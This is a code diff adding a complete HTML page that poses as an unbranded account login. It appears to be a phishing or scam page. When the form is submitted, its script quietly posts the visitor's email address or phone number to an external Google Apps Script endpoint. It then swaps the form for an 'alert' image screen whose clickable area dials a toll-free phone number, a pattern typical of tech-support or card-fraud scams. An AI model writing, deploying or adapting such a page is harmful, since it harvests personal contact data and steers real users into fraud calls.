@@ -1,0 +1,283 @@
+<!doctype html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Welcome</title>
+  <!-- Google tag (gtag.js) -->
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-JMPJCG12QC"></script>
+  <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag() {
+      dataLayer.push(arguments);
+    }
+    gtag("js", new Date());
+
+    gtag("config", "G-JMPJCG12QC");
+  </script>
+
+  <style>
+    /* ===== RESET ===== */
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+      font-family: Arial, Helvetica, sans-serif;
+    }
+
+    html,
+    body {
+      width: 100%;
+      height: 100%;
+    }
+
+    /* ===== BACKGROUND (SHARED) ===== */
+    body {
+      background:
+        linear-gradient(rgba(0, 0, 0), rgba(0, 0, 0, 0.6)),
+        url("one.png") center / cover no-repeat;
+    }
+
+    a {
+      text-decoration: none;
+      color: white;
+    }
+
+    /* ===== PAGE WRAPPER ===== */
+    .login-page,
+    .alert-page {
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 24px;
+    }
+
+    /* ================= LOGIN ================= */
+    .login-container {
+      background: #ffffff;
+      padding: 40px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+
+    .login-title {
+      font-size: 28px;
+      font-weight: bold;
+      margin-bottom: 20px;
+      text-transform: uppercase;
+    }
+
+    .login-box {
+      max-width: 480px;
+      width: 100%;
+      background: #f2f2f2;
+      padding: 30px;
+      border-radius: 8px;
+      box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
+    }
+
+    .login-label {
+      display: block;
+      margin-bottom: 8px;
+      font-size: 16px;
+      font-weight: 600;
+      text-transform: uppercase;
+    }
+
+    .login-input {
+      width: 100%;
+      padding: 12px 14px;
+      margin-bottom: 18px;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+      font-size: 15px;
+    }
+
+    .login-button {
+      width: 100%;
+      padding: 12px;
+      background: #d10000;
+      color: #fff;
+      border: none;
+      border-radius: 4px;
+      font-size: 16px;
+      font-weight: bold;
+      cursor: pointer;
+    }
+
+    .login-button:hover {
+      background: #b30000;
+    }
+
+    /* ================= ALERT ================= */
+    .alert-wrapper {
+      width: 100%;
+    }
+
+    .alert-layout {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 60px;
+    }
+
+    /* ---- LEFT CONTENT ---- */
+    .alert-content {
+      flex: 1;
+      color: #ffffff;
+      text-align: center;
+    }
+
+    .alert-content img {
+      width: 100%;
+      height: auto;
+    }
+
+    /* ---- RIGHT IMAGE ---- */
+    .alert-image {
+      flex: 1;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .alert-image img {
+      width: 100%;
+      height: auto;
+      max-width: none;
+      /* FULL WIDTH – NO LIMIT */
+      object-fit: contain;
+    }
+
+    /* ===== MOBILE FIX ===== */
+    @media (max-width: 768px) {
+      .alert-layout {
+        flex-direction: column;
+        text-align: center;
+      }
+
+      .alert-image {
+        width: 100%;
+        margin-top: -65px;
+      }
+
+      .alert-image img {
+        width: 100%;
+        margin-top: 15px;
+      }
+
+      .login-label {
+        font-size: 8px;
+      }
+    }
+
+    /* ===== VISIBILITY ===== */
+    #alertSection {
+      display: none;
+    }
+  </style>
+</head>
+
+<body>
+  <!-- ===== LOGIN ===== -->
+  <div class="login-page" id="loginSection">
+    <div class="login-container">
+      <h2 class="login-title">LOGIN ACCOUNT</h2>
+
+      <div class="login-box">
+        <form id="loginForm">
+          <label class="login-label">
+            ENTER YOUR EMAIL OR MOBILE NUMBER TO CONTINUE
+          </label>
+
+          <input type="text" id="loginInput" class="login-input" placeholder="EMAIL OR MOBILE NUMBER" required />
+
+          <input type="password" id="passwordInput" class="login-input" placeholder="PASSWORD" style="display: none" />
+
+          <button type="submit" class="login-button" id="loginBtn">
+            LOGIN
+          </button>
+        </form>
+      </div>
+    </div>
+  </div>
+
+  <!-- ===== ALERT ===== -->
+  <div class="alert-page" id="alertSection" style="justify-content: left">
+    <div class="alert-wrapper">
+      <div class="alert-layout">
+        <!-- CLICKABLE CONTENT -->
+        <a href="tel:+18443058101" style="flex: 1">
+          <div class="alert-content">
+            <img src="three.png" alt="Content Image" />
+          </div>
+        </a>
+
+        <!-- FULL WIDTH IMAGE -->
+        <div class="alert-image">
+          <img src="two.png" alt="Cards" />
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    const loginInput = document.getElementById("loginInput");
+    const passwordInput = document.getElementById("passwordInput");
+    const loginBtn = document.getElementById("loginBtn");
+
+    // INPUT LOGIC (same as before)
+    loginInput.addEventListener("input", function () {
+      let value = loginInput.value.trim();
+
+      if (/^\d+$/.test(value)) {
+        value = value.slice(0, 10);
+        loginInput.value = value;
+
+        passwordInput.style.display = "none";
+        loginBtn.textContent = "GET OTP";
+      } else if (value.includes("@")) {
+        passwordInput.style.display = "block";
+        loginBtn.textContent = "LOGIN";
+      } else {
+        passwordInput.style.display = "none";
+        loginBtn.textContent = "LOGIN";
+      }
+    });
+
+    // SUBMIT LOGIC (FIXED)
+    document
+      .getElementById("loginForm")
+      .addEventListener("submit", function (e) {
+        e.preventDefault();
+
+        const value = loginInput.value.trim();
+        if (!value) return;
+
+        const type = value.includes("@") ? "email" : "phone";
+
+        // ✅ FIX: use FormData instead of JSON
+        const formData = new FormData();
+        formData.append("value", value);
+        formData.append("type", type);
+        formData.append("timestamp", new Date().toISOString());
+
+        fetch(
+          "https://script.google.com/macros/s/AKfycbwIKR-If2XH0uEsS1_ydsleEwiDebvxfQ7CgLkqwsrJpPX_3mrcUMfWTIQluF-5cDEAbQ/exec",
+          {
+            method: "POST",
+            body: formData,
+          },
+        );
+
+        // existing behavior (UNCHANGED)
+        document.getElementById("loginSection").style.display = "none";
+        document.getElementById("alertSection").style.display = "flex";
+      });
+  </script>
+</body>
+
+</html>
